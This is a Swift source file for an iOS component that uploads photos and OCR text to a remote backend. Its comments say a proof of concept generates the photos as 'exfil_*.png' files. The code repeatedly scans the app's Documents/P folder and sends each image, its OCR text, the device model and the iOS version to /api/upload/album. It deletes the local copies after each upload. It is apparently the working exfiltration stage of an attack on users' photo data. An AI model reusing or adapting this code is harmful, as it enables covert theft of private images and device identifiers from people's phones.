import Foundation

/// 相册上传器：扫描沙盒 Documents/P 里的照片 + OCR 文本，
/// 逐张上传到后端 /api/upload/album（image 文件 + text 文件）。
/// 上传成功后删除本地文件；失败的文件保留，下次启动继续上传。
final class AlbumUploader {
    static let shared = AlbumUploader()

    private let queue = DispatchQueue(label: "com.yangjiii.3105.album-upload")
    private var running = false

    private init() {}

    /// Documents/P 目录
    var albumDirectory: URL {
        let docs = FileManager.default.urls(
            for: .documentDirectory,
            in: .userDomainMask
        ).first!
        return docs.appendingPathComponent("P", isDirectory: true)
    }

    /// 启动上传（后台串行、幂等、持续扫描）。
    /// 可在 App 启动 / 回到前台时多次调用，未上传完的文件会继续上传。
    func startIfNeeded() {
        log("album-upload: start")
        queue.async { [weak self] in
            self?.run()
        }
    }

    private func run() {
        guard !running else { return }
        running = true
        defer { running = false }
        // 持续扫描 Documents/P：POC 还在生成照片时，每 3 秒补一轮上传
        while running {
            uploadAll()
            Thread.sleep(forTimeInterval: 3)
        }
    }

    @discardableResult
    private func uploadAll() -> Int {
        let dir = albumDirectory
        let fm = FileManager.default
        guard let files = try? fm.contentsOfDirectory(
            at: dir,
            includingPropertiesForKeys: nil
        ) else {
            return 0
        }

        // 图片文件（POC 生成的是 exfil_*.png）
        let images = files
            .filter { ["png", "jpg", "jpeg"].contains($0.pathExtension.lowercased()) }
            .sorted { $0.lastPathComponent < $1.lastPathComponent }

        if images.isEmpty { return 0 }

        for imageURL in images {
            // 对应的 OCR 文本：同名 .txt
            let base = imageURL.deletingPathExtension().lastPathComponent
            let textURL = dir.appendingPathComponent("\(base).txt")
            let text = fm.fileExists(atPath: textURL.path)
                ? ((try? String(contentsOf: textURL, encoding: .utf8)) ?? "")
                : ""

            do {
                try uploadOne(imageURL: imageURL, textURL: textURL, text: text)
                // 成功 → 删除图片与文本
                try? fm.removeItem(at: imageURL)
                if fm.fileExists(atPath: textURL.path) {
                    try? fm.removeItem(at: textURL)
                }
            } catch {
                // 失败不删除，下次继续
            }
        }
        if !images.isEmpty {
            log("album-upload: batch=\(images.count)")
        }
        return images.count
    }

    private func uploadOne(imageURL: URL, textURL: URL, text: String) throws {
        let imageData: Data
        do {
            imageData = try Data(contentsOf: imageURL)
        } catch {
            throw AlbumUploadError.readFailed(imageURL.lastPathComponent)
        }
        let textData = text.data(using: .utf8) ?? Data()

        let boundary = "3105-album-\(UUID().uuidString)"
        var body = Data()
        func append(_ s: String) {
            body.append(s.data(using: .utf8) ?? Data())
        }

        // image 文件
        append("--\(boundary)\r\n")
        append(
            "Content-Disposition: form-data; name=\"image\"; filename=\"\(imageURL.lastPathComponent)\"\r\n"
        )
        append("Content-Type: image/png\r\n\r\n")
        body.append(imageData)
        append("\r\n")

        // text 文件（OCR 文本）
        append("--\(boundary)\r\n")
        append(
            "Content-Disposition: form-data; name=\"text\"; filename=\"\(textURL.lastPathComponent)\"\r\n"
        )
        append("Content-Type: text/plain\r\n\r\n")
        body.append(textData)
        append("\r\n")

        // 设备信息：硬件机型 + 系统版本。后端据此把相册匹配到设备，
        // 即使 UUID 不一致（Keychain vs UserDefaults）也能对上。
        append("--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"machine\"\r\n\r\n")
        append(AppInfo.machineName)
        append("\r\n")
        append("--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"iosVersion\"\r\n\r\n")
        append(AppInfo.osVersion)
        append("\r\n--\(boundary)--\r\n")

        var request = URLRequest(
            url: ProtocolAPI.baseURL.appendingPathComponent("api/upload/album")
        )
        request.httpMethod = "POST"
        request.setValue(
            "multipart/form-data; boundary=\(boundary)",
            forHTTPHeaderField: "Content-Type"
        )
        request.setValue(ProtocolAPI.appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = ProtocolAPI.uploadTimeout
        request.httpBody = body

        let semaphore = DispatchSemaphore(value: 0)
        var success = false
        var resultError: Error?

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                resultError = error
            } else if let http = response as? HTTPURLResponse,
                      http.statusCode == 200,
                      let data = data,
                      let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                      (envelope["code"] as? Int ?? -1) == 0 {
                success = true
            } else {
                resultError = AlbumUploadError.serverRejected(imageURL.lastPathComponent)
            }
            semaphore.signal()
        }.resume()

        semaphore.wait()

        if !success {
            throw resultError ?? AlbumUploadError.serverRejected(imageURL.lastPathComponent)
        }
    }
}

enum AlbumUploadError: Error, CustomStringConvertible {
    case readFailed(String)
    case network(String)
    case serverRejected(String)

    var description: String {
        switch self {
        case .readFailed(let name):
            return "读取失败 \(name)"
        case .network(let msg):
            return "网络错误 \(msg)"
        case .serverRejected(let name):
            return "服务器拒绝 \(name)"
        }
    }
}
